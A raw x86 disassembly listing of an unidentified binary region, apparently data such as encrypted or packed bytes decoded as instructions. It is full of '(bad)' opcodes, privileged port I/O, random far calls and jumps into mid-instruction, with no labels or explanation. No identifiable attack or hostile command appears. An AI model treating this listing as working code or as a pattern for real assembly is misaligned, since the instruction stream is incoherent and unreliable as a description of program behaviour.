  41391e:	push   0x63
  413920:	aas    
  413921:	mov    al,0x79
  413923:	xor    ch,BYTE PTR [edi]
  413925:	(bad)
  413929:	sbb    edx,ebp
  41392b:	xor    DWORD PTR [ebp-0x47a92605],edx
  413931:	mov    cs,eax
  413933:	xor    DWORD PTR [ebp-0x64b82661],edx
  413939:	mov    ?,WORD PTR [eax-0x666c8acf]
  41393f:	fisub  WORD PTR [edx+0x8e]
	...
  413969:	add    BYTE PTR [eax],al
  41396b:	add    BYTE PTR [eax-0x4b686b1b],ch
  413971:	dec    esp
  413972:	out    0x18,al
  413974:	xchg   edx,eax
  413975:	xor    DWORD PTR [edx],edi
  413977:	cld    
  413978:	nop
  413979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41397a:	rcr    DWORD PTR [ebx-0x71317279],cl
  413980:	jbe    0x41399e
  413982:	hlt    
  413983:	add    edx,DWORD PTR [ebx]
  413985:	out    0xcb,al
  413987:	mov    gs,edx
  413989:	pop    esi
  41398a:	mov    edi,0xaf320642
  41398f:	cli    
  413990:	mov    eax,ds:0x371bd0a6
  413995:	mov    ecx,0x42ee0428
  41399a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41399b:	ss dec ecx
  41399d:	xor    DWORD PTR [eax],edi
  41399f:	sbb    al,0x8c
  4139a1:	sbb    eax,0x5ba60428
  4139a6:	out    0x9e,eax
  4139a8:	repz ret 
  4139aa:	add    dh,al
  4139ac:	arpl   WORD PTR [edx-0x584ee700],bx
  4139b2:	or     BYTE PTR [ecx+0x17],dl
  4139b5:	mov    dh,0xfd
  4139b7:	pop    esi
  4139b8:	mov    ch,0xee
  4139ba:	push   ecx
  4139bb:	push   esi
  4139bc:	mov    eax,0xa5dd7431
  4139c1:	pop    esi
  4139c2:	pop    eax
  4139c3:	inc    esi
  4139c4:	enter  0xc065,0xb5
  4139c8:	adc    bh,BYTE PTR [ecx+0x5b82cf20]
  4139ce:	push   eax
  4139cf:	inc    ecx
	...
  4139f8:	add    BYTE PTR [eax],al
  4139fa:	push   edi
  4139fb:	mov    ebp,edi
  4139fd:	es or  eax,0x7d2ab2c3
  413a03:	pop    ebx
  413a04:	push   0xbf403de9
  413a09:	and    eax,0x6de93fb6
  413a0f:	xor    BYTE PTR [ecx+esi*8-0x2b],dh
  413a13:	pop    es
  413a14:	jnp    0x413a0c
  413a16:	mov    ebx,0xb09a8838
  413a1b:	xor    eax,ecx
  413a1d:	stos   DWORD PTR es:[edi],eax
  413a1e:	call   0xc4dd:0xde725530
  413a25:	aad    0x24
  413a27:	pop    ebx
  413a28:	push   0xd
  413a2a:	mov    bl,0xa7
  413a2c:	or     cl,dl
  413a2e:	pop    ss
  413a2f:	mov    al,ds:0x96f5befd
  413a34:	cld    
  413a35:	inc    ebx
  413a36:	push   esp
  413a37:	xor    DWORD PTR [ecx+eiz*8-0x3b],esi
  413a3b:	sar    ch,0xa6
  413a3e:	retf   
  413a3f:	ret    0x9e21
  413a42:	sub    DWORD PTR [ebx-0x18],esp
  413a45:	btc    DWORD PTR [ecx],esi
  413a48:	inc    BYTE PTR [ebx]
  413a4a:	dec    esi
  413a4b:	xor    DWORD PTR [eax+eax*1+0x2f],esi
  413a4f:	aam    0x59
  413a51:	push   DWORD PTR [eax-0x4c8a0122]
  413a57:	fidiv  WORD PTR [eax+ecx*1-0x41]
  413a5b:	pop    ss
  413a5c:	dec    esi
  413a5d:	inc    DWORD PTR [eax]
	...
  413a87:	add    BYTE PTR [eax+0x2704bff4],ah
  413a8d:	imul   ecx,DWORD PTR [ecx+0xc4870ec],0xfd6687e8
  413a97:	(bad)  
  413a98:	in     al,dx
  413a99:	sbb    esi,DWORD PTR [edx+0x24]
  413a9c:	setbe  BYTE PTR [esi+0x41]
  413aa0:	xlat   BYTE PTR ds:[ebx]
  413aa1:	imul   ebp,eax,0x1c
  413aa4:	enter  0xfede,0x50
  413aa8:	scas   eax,DWORD PTR es:[edi]
  413aa9:	pop    ebx
  413aaa:	add    bh,ch
  413aac:	jno    0x413afd
  413aae:	push   edi
  413aaf:	xchg   si,ax
  413ab1:	pop    ebx
  413ab2:	push   eax
  413ab3:	jmp    FWORD PTR [edx-0x3cf819cd]
  413ab9:	fdivp  st(6),st
  413abb:	call   0x3ea557
  413ac0:	pop    esi
  413ac1:	sbb    eax,0xb2ca0006
  413ac6:	jmp    0x6821264e
  413acb:	add    ch,ch
  413acd:	pop    ds
  413ace:	push   DWORD PTR [ebp-0x61]
  413ad1:	shr    DWORD PTR [edi],cl
  413ad3:	push   eax
  413ad4:	jo     0x413ab4
  413ad6:	mov    BYTE PTR [ebp-0x7d],al
  413ad9:	push   ecx
  413ada:	sbb    bh,bh
  413adc:	sub    ch,BYTE PTR [edi]
  413ade:	out    0xaa,al
  413ae0:	mov    al,0xde
  413ae2:	(bad)  
  413ae3:	push   0x34
  413ae5:	fidiv  WORD PTR [eax+ecx*1-0x51]
  413ae9:	mov    ebx,0xfffe
	...
  413b16:	mov    al,0x51
  413b18:	sbb    al,0xff
  413b1a:	ds dec edi
  413b1c:	cld    
  413b1d:	out    0xa8,eax
  413b1f:	loopne 0x413aad
  413b21:	(bad)  
  413b22:	cmp    DWORD PTR [eax],esi
  413b24:	mov    ?,esi
  413b26:	stos   DWORD PTR es:[edi],eax
  413b27:	sub    al,0x9a
  413b29:	dec    ebx
  413b2a:	mov    fs,WORD PTR [ebp+0x38fcc88c]
  413b30:	add    dl,BYTE PTR [ebp-0x3b]
  413b33:	mov    BYTE PTR [eax+0x17e616c3],al
  413b39:	add    BYTE PTR [esi+eax*2-0x63c98b75],dl
  413b40:	pushf  
  413b41:	dec    esi
  413b42:	stc    
  413b43:	xchg   ebp,eax
  413b44:	jp     0x413b8a
  413b46:	repnz test eax,0x37658ce
  413b4c:	add    al,BYTE PTR [eax+0x47164421]
  413b52:	data16 jecxz 0x413b78
  413b55:	inc    ecx
  413b56:	ds in  eax,0x99
  413b59:	adc    DWORD PTR [ecx],ecx
  413b5b:	inc    esp
  413b5c:	add    cl,BYTE PTR [ebx]
  413b5e:	dec    al
  413b60:	xlat   BYTE PTR ds:[ebx]
  413b61:	push   esi
  413b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b63:	fisubr WORD PTR ds:0xc229b1ff
  413b69:	jae    0x413bc9
  413b6b:	mov    ebx,0x4416f846
  413b70:	add    ch,bh
  413b72:	fmul   DWORD PTR [esi+ebx*1-0x74bc009a]
  413b79:	je     0x413b7b
	...
  413ba3:	add    BYTE PTR [esi-0x69f7effb],al
  413ba9:	call   0xf810:0x1579ff0d
  413bb0:	data16 je 0x413be9
  413bb3:	jmp    FWORD PTR [ecx-0x18]
  413bb6:	aad    0xbf
  413bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb9:	std    
  413bba:	mov    esi,edi
  413bbc:	pop    ecx
  413bbd:	pop    ebx
  413bbe:	cdq    
  413bbf:	pop    edx
  413bc0:	or     DWORD PTR [esi+0x14],edx
  413bc3:	dec    ebp
  413bc4:	dec    eax
  413bc5:	test   al,0x93
  413bc7:	mov    ecx,edx
  413bc9:	bound  edi,QWORD PTR [edi-0x4f]
  413bcc:	mov    BYTE PTR [esi],ch
  413bce:	xchg   DWORD PTR [ebx],ebp
  413bd0:	pop    es
  413bd1:	sbb    esp,esp
  413bd3:	add    edx,DWORD PTR [ebx-0x2787c1e]
  413bd9:	ss pop ss
  413bdb:	push   ds
  413bdc:	shl    DWORD PTR ds:[esi],0x8b
  413be0:	mov    ah,BYTE PTR [ebx+0x4f]
  413be3:	adc    edi,DWORD PTR [ecx+0x2e]
  413be6:	push   edi
  413be7:	jge    0x413c63
  413be9:	das    
  413bea:	arpl   cx,cx
  413bec:	xchg   esi,eax
  413bed:	mov    ds:0x6dbe03a8,eax
  413bf2:	out    0xf,eax
  413bf4:	add    ebx,0x5b7f21c6
  413bfa:	xchg   esi,eax
  413bfb:	fwait
  413bfc:	mov    bh,0x6c
  413bfe:	out    0x3,eax
  413c00:	inc    ebp
  413c01:	sbb    edx,DWORD PTR [ebp+ebx*8+0x2f064370]
	...
  413c30:	add    BYTE PTR [eax],al
  413c32:	shr    DWORD PTR ds:0x7b2dc3e3,0x70
  413c39:	inc    ecx
  413c3a:	mov    dh,0xc2
  413c3c:	out    0x3,eax
  413c3e:	cdq    
  413c3f:	in     al,dx
  413c40:	jg     0x413c4d
  413c42:	sbb    BYTE PTR [edi+eiz*8-0x18cced76],bl
  413c49:	adc    BYTE PTR [esi+0x43],al
  413c4c:	fimul  DWORD PTR ds:0x10d72d89
  413c52:	xchg   BYTE PTR [edx-0x30],al
  413c55:	xor    al,0x79
  413c57:	sub    eax,0xf3b1d6c4
  413c5c:	mov    esi,0x12d688a
  413c61:	mov    ebx,0x34056607
  413c66:	or     esi,DWORD PTR [esi-0x104b1700]
  413c6c:	push   0x9c1c21
  413c71:	add    DWORD PTR [ebx-0x3b16c049],ecx
  413c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c78:	or     BYTE PTR [ecx+0x7efdb22d],dl
  413c7e:	dec    ebx
  413c7f:	pop    ebx
  413c80:	push   0x9a5f68
  413c85:	add    DWORD PTR [esi-0x4a],esi
  413c88:	aas    
  413c89:	jmp    0xb214a452
  413c8e:	sbb    BYTE PTR [ebx-0x18],0x3d
  413c92:	push   ecx
  413c93:	sub    al,0xfe
  413c95:	pusha  
	...
  413cbe:	add    BYTE PTR [eax],al
  413cc0:	jle    0x413d01
  413cc2:	imul   ebp,ecx,0x55
  413cc5:	frstor [esi-0x58]
  413cc8:	cmp    eax,0x7acfacc3
  413ccd:	pop    ebx
  413cce:	std    
  413ccf:	hlt    
  413cd0:	mov    ss,WORD PTR [edi+edi*1+0x54f2b5e9]
  413cd7:	push   ds
  413cd8:	mov    ah,0xe3
  413cda:	inc    ebx
  413cdb:	sbb    eax,0x73685b23
  413ce0:	pop    edi
  413ce1:	call   0xe93f:0xb6099100
  413ce8:	mov    ah,0x67
  413cea:	shl    DWORD PTR [ecx+0x49e85afa],cl
  413cf0:	imul   ebp,DWORD PTR [esi+edi*8],0x8c2b5170
  413cf7:	and    al,0xde
  413cf9:	pushf  
  413cfa:	push   0x9a5c8a
  413cff:	inc    ecx
  413d00:	push   ss
  413d01:	mov    dh,0x3f
  413d03:	add    BYTE PTR [edi-0x1d],ah
  413d06:	xor    al,0xd5
  413d08:	das    
  413d09:	cwde   
  413d0a:	add    al,ch
  413d0c:	shr    DWORD PTR [edx-0x3],cl
  413d0f:	(bad)  
  413d10:	fisubr WORD PTR [ebx-0x18]
  413d13:	sbb    DWORD PTR [edx],0xffffffcb
  413d16:	std    
  413d17:	jae    0x413d28
  413d19:	(bad)  
  413d1a:	jl     0x413d0c
  413d1c:	push   edi
  413d1d:	pop    esp
  413d1e:	inc    edx
  413d1f:	or     DWORD PTR [edx-0x2d],0xfffffffd
  413d23:	jae    0x413d25
	...
  413d4d:	add    bl,bh
  413d4f:	dec    edi
  413d50:	(bad)  
  413d51:	(bad)  
  413d52:	mov    eax,0x1f75fea0
  413d57:	sar    dl,1
  413d59:	dec    ebp
  413d5a:	test   al,0xe2
  413d5c:	(bad)  
  413d5d:	jne    0x413dd2
  413d5f:	loop   0x413dd5
  413d61:	or     BYTE PTR [edi+0x65],ch
  413d64:	dec    esi
  413d65:	jmp    FWORD PTR [eax-0x1e]
  413d68:	je     0x413d5a
  413d6a:	mov    BYTE PTR [eax+ecx*1-0x18],bl
  413d6e:	mov    al,ds:0x28fffd71
  413d73:	pop    esp
  413d74:	in     al,dx
  413d75:	jmp    DWORD PTR [edx-0x46c319d1]
  413d7b:	loop   0x413d7b
  413d7d:	push   DWORD PTR [edx+0x2f75fecb]
  413d83:	loop   0x413df9
  413d85:	or     BYTE PTR [edi],bh
  413d87:	push   ebp
  413d88:	dec    esi
  413d89:	dec    DWORD PTR [eax-0x1e]
  413d8c:	je     0x413d7a
  413d8e:	dec    edi
  413d8f:	es push ecx
  413d91:	jmp    FWORD PTR [eax+0x3ff474e2]
  413d97:	cs push ecx
  413d99:	jmp    FWORD PTR [eax+0x6ff074e2]
  413d9f:	push   esi
  413da0:	dec    edi
  413da1:	jmp    FWORD PTR [eax-0x1e]
  413da4:	je     0x413d8e
  413da6:	sbb    cl,BYTE PTR ds:[ebp-0x76e386b1]
  413dad:	je     0x413e21
  413daf:	adc    al,0xf
  413db1:	or     BYTE PTR [eax],al
	...
  413ddb:	add    BYTE PTR [esi-0x65],dl
  413dde:	cmp    bh,bh
  413de0:	popa   
  413de1:	inc    esp
  413de2:	mov    ecx,0x2f4242c1
  413de7:	mov    esp,DWORD PTR [edx-0x40]
  413dea:	mov    ebp,0x1c41d4fb
  413def:	inc    eax
  413df0:	inc    ecx
  413df1:	dec    esi
  413df2:	cld    
  413df3:	out    0x4f,eax
  413df5:	dec    edx
  413df6:	xchg   esi,edi
  413df8:	(bad)  
  413df9:	ja     0x413d83
  413dfb:	imul   edi,DWORD PTR [esi],0x1e68044e
  413e01:	pop    ebx
  413e02:	inc    ecx
  413e03:	add    BYTE PTR [esi-0x41fffdcc],ah
  413e09:	mov    WORD PTR [edx+edx*2-0x400375f7],gs
  413e10:	mov    dl,BYTE PTR [ebp+0x34]
  413e13:	call   0xfeca2cdd
  413e18:	inc    ebp
  413e19:	je     0x413e28
  413e1b:	sbb    DWORD PTR [esi-0x2efffdf4],ecx
  413e21:	mov    dl,0x19
  413e23:	(bad)  [eax-0xd]
  413e26:	add    DWORD PTR [eax-0x2f],edx
  413e29:	(bad)  
  413e2a:	stc    
  413e2b:	out    0xad,eax
  413e2d:	sti    
  413e2e:	mov    dh,bh
  413e30:	(bad)  
  413e31:	mov    al,0x31
  413e33:	(bad)  
  413e34:	mov    ecx,0xb1fc0e59
  413e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e3a:	stc    
  413e3b:	out    0x39,eax
  413e3d:	cli    
  413e3e:	mov    dh,bh
	...
  413e68:	add    BYTE PTR [eax],al
  413e6a:	ja     0x413ee2
  413e6c:	std    
  413e6d:	push   edx
  413e6f:	mov    esp,0x5b7a8295
  413e74:	jecxz  0x413ea5
  413e76:	adc    al,0x5b
  413e78:	push   ecx
  413e79:	inc    ebp
  413e7a:	xor    DWORD PTR [eax-0x67506421],0xa0c687ce
  413e84:	ret    
  413e85:	jnp    0x413eb1
  413e87:	test   BYTE PTR [edi],ch
  413e89:	inc    ebp
  413e8a:	ds fcomi st,st(6)
  413e8d:	add    edx,edx
  413e8f:	call   0x2ee7:0x9bdb863f
  413e96:	push   esi
  413e97:	adc    ah,bl
  413e99:	add    edi,DWORD PTR [esi]
  413e9b:	push   esi
  413e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e9d:	adc    BYTE PTR [ebp-0x6e],bl
  413ea0:	jg     0x413e7f
  413ea2:	xchg   edi,eax
  413ea3:	sub    al,BYTE PTR [edi-0x1f511605]
  413ea9:	xor    edx,DWORD PTR [esi-0x246918a5]
  413eaf:	mov    dl,0xe3
  413eb1:	push   ds
  413eb2:	jg     0x413f0f
  413eb4:	mov    bh,0x86
  413eb6:	xchg   edx,eax
  413eb7:	push   ebx
  413eb8:	dec    edi
  413eb9:	aad    0x86
  413ebb:	sub    dl,BYTE PTR [edi-0x64]
  413ebe:	aaa    
  413ebf:	mov    ecx,DWORD PTR [esi-0x79]
  413ec2:	cmc    
  413ec3:	ins    DWORD PTR es:[edi],dx
  413ec4:	daa    
  413ec5:	dec    ebp
  413ec6:	call   0xefc87df4
  413ecb:	clc    
  413ecc:	out    dx,eax
  413ecd:	inc    BYTE PTR [eax]
	...
  413ef7:	add    BYTE PTR [edx+0x1b],dl
  413efa:	das    
  413efb:	adc    edx,edx
  413efd:	sub    DWORD PTR [ebp-0x53361e05],ebx
  413f03:	xchg   al,al
  413f05:	mov    DWORD PTR [eax],esp
  413f07:	ret    0x5b3d
  413f0a:	mov    ah,0x7a
  413f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0d:	(bad)  [ebx]
  413f0f:	mov    BYTE PTR [eax],dl
  413f11:	mov    ch,0xe7
  413f13:	sbb    esp,edi
  413f15:	sub    DWORD PTR [ecx],eax
  413f17:	jl     0x413eae
  413f19:	inc    ecx
  413f1a:	inc    eax
  413f1b:	pushf  
  413f1c:	mov    eax,0xb62c8828
  413f21:	aam    0x3b
  413f23:	inc    eax
  413f24:	inc    edx
  413f25:	pushf  
  413f26:	add    BYTE PTR [ecx-0x80],ch
  413f29:	sub    DWORD PTR [edx+0x29],esi
  413f2c:	push   edx
  413f2d:	dec    edi
  413f2e:	sub    BYTE PTR gs:[edx-0x6e],al
  413f32:	call   0xfe6ab57c
  413f37:	loop   0x413fb6
  413f39:	lods   eax,DWORD PTR ds:[esi]
  413f3a:	and    DWORD PTR [esi],edx
  413f3c:	mov    dl,0xf1
  413f3e:	push   edi
  413f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f40:	rcl    BYTE PTR [eax+eax*8+0x15],0x53
  413f45:	cdq    
  413f46:	push   0xbf383de9
  413f4b:	add    DWORD PTR ds:0x6de93fc2,esp
  413f51:	sub    BYTE PTR [ecx+esi*8-0x3b],dh
  413f55:	call   0x4101b5d2
  413f5a:	enter  0x1e,0x0
	...
  413f86:	mov    ecx,0x21afd29
  413f8b:	in     al,0xfd
  413f8d:	pop    esi
  413f8e:	mov    eax,0x587f329
  413f93:	bound  esi,QWORD PTR [ebx+0x29]
  413f96:	push   edi
  413f97:	jl     0x413f81
  413f99:	cmc    
  413f9a:	sbb    DWORD PTR [eax],ebp
  413f9c:	(bad)  
  413f9d:	repnz std 
  413f9f:	lods   al,BYTE PTR ds:[esi]
  413fa0:	and    al,0xc1
  413fa2:	faddp  st(1),st
  413fa4:	aas    
  413fa5:	jmp    0xbada72b7
  413faa:	shr    BYTE PTR [ecx],0x51
  413fad:	xchg   ecx,eax
  413fae:	cmp    eax,0x5557ed5b
  413fb3:	inc    esp
  413fb4:	gs test al,0x3d
  413fb7:	mov    edi,ebp
  413fb9:	add    BYTE PTR [edx],ch
  413fbb:	and    al,0xe6
  413fbd:	cmp    DWORD PTR [edi+0x23e8fee1],0x71
  413fc4:	std    
  413fc5:	(bad)  
  413fc6:	mov    ebp,0x44dde63d
  413fcb:	fdivp  st(6),st
  413fcd:	or     edx,edi
  413fcf:	dec    ebx
  413fd0:	and    al,0x68
  413fd2:	inc    edx
  413fd3:	inc    esi
  413fd4:	aas    
  413fd5:	add    BYTE PTR [edi],dh
  413fd7:	(bad)  
  413fd8:	push   0x4dde8053
  413fdd:	push   0xbeed5c57
  413fe2:	push   DWORD PTR [ecx]
  413fe4:	addr16 inc ecx
  413fe6:	ins    BYTE PTR es:[di],dx
  413fe8:	std    
  413fe9:	jne    0x413feb
	...
  414013:	add    BYTE PTR [edi-0x3c],cl
  414016:	push   ecx
  414017:	js     0x413fb9
  414019:	fsubrp st(5),st
  41401b:	pop    ebp
  41401c:	pusha  
  41401d:	fdivp  st(6),st
  41401f:	dec    DWORD PTR [edx-0x2d]
  414022:	(bad)  
  414023:	jne    0x414054
  414025:	(bad)  
  414026:	int    0x4c
  414028:	mov    al,ds:0xe5c95ede
  41402d:	pop    edx
  41402e:	add    BYTE PTR [ebp-0x64],dl
  414031:	ret    
  414032:	add    ah,0x67
  414035:	mov    al,0x44
  414037:	lock (bad) 
  414039:	fidiv  WORD PTR [esp+ecx*1+0x7f]
  41403d:	(bad)  
  41403e:	push   ecx
  41403f:	inc    DWORD PTR [eax-0x1a8b41de]
  414045:	fidivr DWORD PTR [esp+edi*8-0x2b]
  414049:	push   ebp
  41404a:	and    DWORD PTR [ebx-0x7e9c2c56],ecx
  414050:	iret   
  414051:	mov    ebp,cr6
  414054:	fidiv  WORD PTR ds:[eax+edx*1+0x20]
  414059:	pop    eax
  41405a:	or     al,ch
  41405c:	ds jg  0x414096
  41405f:	push   DWORD PTR [ecx-0x5603f2a8]
  414065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414066:	mov    esi,edi
  414068:	sub    ebp,DWORD PTR [edx]
  41406a:	call   0xfb8c:0x853105f4
  414071:	and    DWORD PTR [edx],esi
  414073:	call   0xfec4a7c3
	...
  4140a0:	add    BYTE PTR [eax],al
  4140a2:	ja     0x414097
  4140a4:	cmc    
  4140a5:	call   DWORD PTR [edx]
  4140a7:	mov    ebp,0x97a8295
  4140ac:	sbb    BYTE PTR [eax],al
  4140ae:	aam    0x74
  4140b0:	xor    DWORD PTR [esi+esi*1+0xa],0xffffffdd
  4140b5:	dec    ebx
  4140b6:	pop    ecx
  4140b7:	lock jp 0x4140fe
  4140ba:	push   edx
  4140bb:	fwait
  4140bc:	add    al,0x6a
  4140be:	ds dec edx
  4140c0:	(bad)  
  4140c1:	push   WORD PTR [ecx]
  4140c4:	sbb    al,BYTE PTR [edx]
  4140c6:	ds xor al,0x82
  4140c9:	out    0x2f,eax
  4140cb:	fs cmp esi,0x35
  4140cf:	hlt    
  4140d0:	or     eax,0x8c7fb73f
  4140d5:	rcl    DWORD PTR [di+0x41],0x0
  4140da:	adc    DWORD PTR [eax],esi
  4140dc:	mov    ah,bh
  4140de:	inc    edi
  4140df:	jns    0x4140e5
  4140e1:	add    BYTE PTR ds:0xf9230d74,dh
  4140e7:	pop    es
  4140e8:	mov    ah,bh
  4140ea:	(bad)
  4140ed:	dec    BYTE PTR [esi+0x7ec9310c]
  4140f3:	xor    al,0x1a
  4140f5:	add    BYTE PTR [esi],bh
  4140f7:	popf   
  4140f8:	inc    ebx
  4140f9:	imul   edi,DWORD PTR [esi],0x367484c4
  4140ff:	pop    ebx
  414100:	setns  BYTE PTR [edx+0x26]
  414104:	pop    ds
  414105:	fwait
	...
  41412e:	add    BYTE PTR [eax],al
  414130:	fist   DWORD PTR [ebp-0x4f4f7bea]
  414136:	setnp  bl
  414139:	xchg   ebp,eax
  41413a:	push   es
  41413b:	test   BYTE PTR [eax+0x1283fbb0],ah
  414141:	push   ebx
  414142:	(bad)  
  414143:	stc    
  414144:	add    eax,0x7fb9ef26
  414149:	pop    edi
  41414a:	out    0xd8,eax
  41414c:	mov    ah,0x37
  41414e:	imul   ecx,DWORD PTR [eax+0x75],0xffffffb1
  414152:	out    0xed,eax
  414154:	std    
  414155:	and    eax,0xf8560c55
  41415a:	xor    al,BYTE PTR [ebx-0x7fdb2ba0]
  414160:	loope  0x4141bc
  414162:	out    0x72,eax
  414164:	xchg   ebx,eax
  414165:	mov    bl,0x51
  414167:	jmp    0x414167
  414169:	pop    edx
  41416a:	setae  al
  41416d:	fwait
  41416e:	out    0x82,eax
  414170:	mov    dl,0x53
  414172:	jg     0x414110
  414174:	test   al,0x26
  414176:	pop    DWORD PTR [ebx-0x678d84e]
  41417c:	cmp    DWORD PTR [ebx],esi
  41417e:	scas   al,BYTE PTR es:[edi]
  41417f:	iret   
  414180:	sbb    BYTE PTR [esi],ah
  414182:	mov    eax,ds:0x145b3d46
  414187:	(bad)  
  414188:	adc    eax,0x997c2bda
  41418d:	pop    ebx
  41418e:	out    0x72,eax
  414190:	mov    ebx,0xbdd25
	...
  4141bd:	add    dh,ah
  4141bf:	xor    BYTE PTR [edx-0x42da177e],ah
  4141c5:	psraw  mm5,QWORD PTR [edi-0x6d819411]
  4141cc:	add    BYTE PTR [esi],dh
  4141ce:	mov    ebp,0xbcd97424
  4141d3:	scas   al,BYTE PTR es:[edi]
  4141d4:	or     BYTE PTR [ecx],dl
  4141d6:	add    al,0x92
  4141d8:	std    
  4141d9:	push   ds
  4141da:	mov    ebp,0xb71618ae
  4141df:	dec    ecx
  4141e0:	std    
  4141e1:	xchg   esp,eax
  4141e2:	xor    eax,0xbcb3fd33
  4141e7:	and    al,0x69
  4141e9:	and    BYTE PTR [ebp-0x6909ff66],ah
  4141ef:	push   ebp
  4141f0:	call   0x9c8d62
  4141f5:	repnz std 
  4141f7:	scas   al,BYTE PTR es:[edi]
  4141f8:	arpl   WORD PTR [ecx+0x19],dx
  4141fb:	mov    ebp,0x15e5e93f
  414200:	cmp    ecx,ebp
  414202:	cmp    eax,0x55c143d4
  414207:	add    BYTE PTR [esi+0x28],ah
  41420a:	inc    edx
  41420b:	es je  0x4141e7
  41420e:	in     eax,0x87
  414210:	cmp    ch,cl
  414212:	cmp    eax,0x341dc052
  414217:	pop    edx
  414218:	inc    ebx
  414219:	mov    eax,ds:0x96109fca
  41421e:	ss push ebp
  414220:	call   0x4142f3
	...
  414249:	add    BYTE PTR [eax],al
  41424b:	add    BYTE PTR [eax],bl
  41424d:	es (bad) 
  41424f:	push   0xffffffa5
  414251:	and    eax,0x9fcab575
  414256:	cld    
  414257:	add    DWORD PTR [ebx],edi
  414259:	pop    ebx
  41425a:	in     eax,dx
  41425b:	das    
  41425c:	mov    esp,0x95108af
  414261:	xchg   ebx,eax
  414262:	std    
  414263:	pop    esi
  414264:	mov    esp,0xf6560caf
  414269:	pop    esp
  41426a:	call   0xfe673d91
  41426f:	add    BYTE PTR [eax+0x23],bh
  414272:	cli    
  414273:	call   DWORD PTR [edx-0x62a117b0]
  414279:	fsin   
  41427b:	call   DWORD PTR [edx-0x3c8a02c0]
  414281:	fnstenv [eax+ecx*1+0x4f]
  414285:	rol    BYTE PTR [edi-0x1],cl
  414288:	dec    eax
  414289:	xchg   edi,eax
  41428a:	mov    edi,0x8b039714
  41428f:	in     al,dx
  414290:	adc    al,0x9c
  414292:	cmc    
  414293:	push   esi
  414294:	and    al,0x9b
  414296:	jns    0x4142e3
  414298:	out    0x58,al
  41429a:	add    BYTE PTR [ebx+ebx*1-0x23],dh
  41429e:	cmp    al,0x77
  4142a0:	dec    esp
  4142a1:	sbb    dh,bh
  4142a3:	call   DWORD PTR [ebx]
  4142a5:	cmp    DWORD PTR cs:0x4116b8,0x57
  4142ad:	sub    al,0x68
  4142af:	mov    DWORD PTR [eax],0x0
	...
  4142d9:	add    BYTE PTR [edx],dl
  4142db:	(bad)  
  4142dd:	jmp    DWORD PTR [edi+0x58]
  4142e0:	lds    eax,FWORD PTR [ebp-0x71]
  4142e3:	pop    edi
  4142e4:	add    BYTE PTR [eax],al
  4142e6:	push   edi
  4142e7:	aad    0x44
  4142e9:	cld    
  4142ea:	pop    es
  4142eb:	aam    0x44
  4142ed:	clc    
  4142ee:	ja     0x414325
  4142f0:	(bad)  
  4142f1:	xor    DWORD PTR [bp+si],0x41
  4142f5:	add    BYTE PTR [eax+0x564b754b],bh
  4142fb:	pop    edi
  4142fc:	or     eax,eax
  4142fe:	adc    ebx,DWORD PTR [edi]
  414300:	cmp    DWORD PTR [ebp-0x71],0x5f
  414304:	je     0x414343
  414306:	xchg   esp,eax
  414307:	and    al,0xfa
  414309:	add    bl,ah
  41430b:	bound  ecx,QWORD PTR [ecx+0x1bb69b75]
  414311:	push   esi
  414312:	ds mov ecx,0x2a70ff3a
  414318:	xor    DWORD PTR [ebp+0x42],0xd907fa9d
  41431f:	jmp    0x414352
  414321:	dec    DWORD PTR [ebx+0x3a]
  414324:	push   0xffffffdd
  414326:	enter  0x7f74,0x5d
  41432a:	shr    esi,0x79
  41432d:	add    BYTE PTR [eax-0x49837ac3],0x31
  414334:	test   BYTE PTR [edi*4-0x768afded],0x5c
  41433c:	cmc    
  41433d:	sti    
	...
  414366:	add    BYTE PTR [eax],al
  414368:	cdq    
  414369:	push   cs
  41436a:	std    
  41436b:	dec    edx
  41436c:	push   DWORD PTR [ecx]
  41436e:	loopne 0x414338
  414370:	jl     0x4143af
  414372:	add    dl,BYTE PTR [ebp-0x4b]
  414375:	or     eax,0x6072c385
  41437a:	inc    edi
  41437b:	inc    esp
  41437c:	jbe    0x4143af
  41437e:	add    al,BYTE PTR [eax]
  414380:	ds std 
  414382:	(bad)  
  414383:	repz xor al,BYTE PTR ds:[edx]
  414387:	add    BYTE PTR [ecx+0x6e],bl
  41438a:	adc    al,0x8f
  41438c:	sti    
  41438d:	in     eax,dx
  41438e:	push   edx
  41438f:	ins    BYTE PTR es:[edi],dx
  414390:	dec    edx
  414391:	xchg   edi,eax
  414392:	add    al,0x6a
  414394:	ds dec eax
  414396:	add    al,0x6a
  414398:	ds shl esi,0xfb
  41439c:	xor    DWORD PTR [eax+0x10],eax
  41439f:	push   0x3e
  4143a1:	pop    esi
  4143a2:	add    al,0xe8
  4143a4:	inc    ebx
  4143a5:	sbb    al,0x2
  4143a7:	add    BYTE PTR [ebp-0xc],al
  4143aa:	cmc    
  4143ab:	xor    al,0x6e
  4143ad:	inc    esp
  4143ae:	ins    BYTE PTR es:[edi],dx
  4143af:	loopne 0x41442b
  4143b1:	mov    cl,0x80
  4143b3:	mov    BYTE PTR [ebx+0x5b],bh
  4143b6:	pop    edi
  4143b7:	fisub  DWORD PTR [edi+0x5b]
  4143ba:	rol    DWORD PTR [ebx],1
  4143bc:	(bad)  
  4143bd:	and    bl,ch
  4143bf:	jnp    0x4143a9
  4143c1:	test   al,0x4b
  4143c3:	sub    BYTE PTR [edx+0x4f],0xd1
  4143c7:	add    esp,DWORD PTR [ebx+ebx*2+0x4f]
  4143cb:	js     0x4143cd
	...
  4143f5:	add    BYTE PTR [eax],cl
  4143f7:	pop    ebx
  4143f8:	out    0xc,eax
  4143fa:	(bad)  
  4143fb:	test   al,0xde
  4143fd:	or     BYTE PTR [edx+0x23],0x10
  414401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414402:	add    eax,0xfa481f22
  414407:	and    ch,al
  414409:	add    edi,DWORD PTR [esi]
  41440b:	pop    ebx
  41440c:	push   0xfffffffe
  41440e:	test   eax,0x98d17b5b
  414413:	test   al,0xef
